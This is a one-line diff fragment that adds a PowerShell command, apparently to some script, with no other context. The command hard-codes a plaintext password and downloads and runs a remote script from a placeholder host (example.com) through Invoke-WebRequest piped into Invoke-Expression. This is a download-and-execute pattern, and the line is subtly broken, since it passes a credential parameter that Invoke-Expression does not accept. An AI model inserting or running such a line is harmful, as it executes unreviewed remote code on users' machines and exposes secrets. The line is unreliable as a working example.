@@ -1,0 +1,1 @@
+$secure = ConvertTo-SecureString 'password' -AsPlainText -Force; iex (iwr 'http://example.com/script.ps1' -UseBasicParsing) -Credential $secure
